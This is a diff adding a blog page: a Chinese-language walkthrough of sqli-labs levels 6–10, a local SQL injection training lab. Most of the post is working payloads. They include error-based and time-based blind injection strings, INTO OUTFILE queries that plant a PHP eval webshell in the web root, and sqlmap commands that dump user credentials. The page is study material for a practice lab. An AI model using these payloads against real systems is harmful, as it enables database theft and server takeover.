@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>Sqli-labs（6-10关） | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    Sqli-labs（6-10关）
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs（6-10关）"><span class="toc-number">1.</span> <span class="toc-text">Sqli-labs（6-10关）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#第六关："><span class="toc-number">1.1.</span> <span class="toc-text">第六关：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-判断"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">1.判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-payload："><span class="toc-number">1.1.0.2.</span> <span class="toc-text">2.payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第七关："><span class="toc-number">1.2.</span> <span class="toc-text">第七关：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第八关："><span class="toc-number">1.3.</span> <span class="toc-text">第八关：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第九关："><span class="toc-number">1.4.</span> <span class="toc-text">第九关：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十关："><span class="toc-number">1.5.</span> <span class="toc-text">第十关：</span></a></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="Sqli-labs（6-10关）"><a href="#Sqli-labs（6-10关）" class="headerlink" title="Sqli-labs（6-10关）"></a>Sqli-labs（6-10关）</h1><p>做sqli-labs的时候输入的这些命令要记住吗？懂得看笔记就行</p>
+<h2 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h2><h4 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h4><p>输入?id=1跟1’ 没错，输入?id=1”报错</p>
+<p>这道题与第五关很类似，就只差了个”</p>
+<p>这道题没有显示位，所以得用双查询报错注入</p>
+<p>双查询注入详解参考的链接：<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a></p>
+<blockquote>
+<p>归纳：</p>
+<p>1）查询数据库名：</p>
+<p>select count(<em>), concat((select database()), floor(rand()</em>2))as a from information_schema.tables group by a;</p>
+<p>2）查询版本：</p>
+<p>select count(<em>), concat((select version()), floor(rand()</em>2))as a from information_schema.tables group by a;</p>
+<p>3）查询用户名：</p>
+<p>select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a;</p>
+<p>4）查询派生表：</p>
+<p>select 1 from (select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a)x;</p>
+</blockquote>
+<h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入?id=-1” union select 1,count(<em>),concat(database(),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到数据库名</p>
+<p>2）输入?id=-1” union select 1,count(<em>),concat((select table_name from information_schema.tables where table_schema=”security” limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到表名</p>
+<p>3）输入?id=-1” union select 1,count(<em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的字段</p>
+<p>4）输入?id=-1” union select 1,count(<em>),concat((select username from security.users limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的username字段的值</p>
+<h2 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h2><p><strong>1.判断：</strong></p>
+<p>输入？id=1、1“没错，输入？id=1’、1‘）报错，各自加上–+还是报错，输入id=1’))–+对了。</p>
+<p><strong>2.</strong>题目下方出现了Use outfile，所以这关不能用以前的方式来做了，得往服务器写入一句话木马文件然后蚁剑连接。</p>
+<p>file权限和into outfile这个函数：<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>into outfile命令是file系列函数来进行读取敏感文件或者写入webshell。</p>
+<p>into outfile命令使用的环境：<br>我们必须知道，服务器上一个可以写入文件的文件夹的完整路径</p>
+<p>查看是否有写入权限，输入<code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> 返回正常，则说明有写入权限。</p>
+<p>输入</p>
+<p><code>?id=-1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\l.php&quot;--+</code></p>
+<p>发现文件导入成功；查看发现里边写的1 2 3，所以可以利用这个上传一句话木马</p>
+<p><code>?id=-1&#39;))  union select 1,&quot;&lt;?php @eval($_POST[&#39;test&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\123.php&quot; --+</code></p>
+<p>然后用蚁剑连接。</p>
+<p>我们怎么知道路径呢？如果要入侵别人的我们怎么会知道路径？</p>
+<h2 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h2><p><strong>1、判断：</strong></p>
+<p>输入?id=1下边显示you are in，输入1‘下边没显示（报错），输入1’–+没报错；说明源码为id=‘ ’</p>
+<p><strong>2、</strong>输入<code>?id=-1&#39; union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\12345.php&quot;--+</code>发现可以成功，所以接下去的步骤与第七关类似。</p>
+<h2 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h2><p><strong>1、判断：</strong></p>
+<p>不管输入什么东西，页面都是you are in；了解知道这个需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：<br>and if((ascii(substr(database(),1,1)))&gt;114,sleep(5),0)</p>
+<p>这里的意思是，如果数据库名首字母的ascii码大于114，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了</p>
+<p>判断时间型盲注语句：’ and sleep(5)%23<br>这里用到的是?id=1’ and sleep(5)–+<br>F12看网络缓存时间，超过5秒就存在时间型盲注</p>
+<p><strong>2.用sqlmap</strong></p>
+<p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql --dbs --batch</code></p>
+<p>得数据库名</p>
+<p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security --tables --batch</code>    </p>
+<p> 得到表名</p>
+<p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security -T users --column --batch</code>      </p>
+<p>得到列名</p>
+<p>输入<code>sqlmap.py -u http://127.0.0.1/sqlilabs/Less-9?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code>     </p>
+<p>得到具体内容</p>
+<p>参考题解：<a href="https://www.jianshu.com/p/875d95f8d3cf" target="_blank" rel="noopener">https://www.jianshu.com/p/875d95f8d3cf</a></p>
+<h2 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h2><p><strong>1、判断：</strong></p>
+<p>跟第九关一样啥也没变，输入’和”都显示正常，尝试?id=3’ and sleep(5)–+，没什么延迟，尝试” and sleep(5)–+延迟时间变为6秒多，说明是双引号的时间型盲注。</p>
+<p><strong>2、用sqlmap注入</strong>，同第九关</p>
+<p>参考题解：<a href="https://www.cnblogs.com/-chenxs/p/11219774.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11219774.html</a></p>
+<p>参考题解：<a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">https://blog.csdn.net/sdb5858874/article/details/80727555</a></p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-17</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
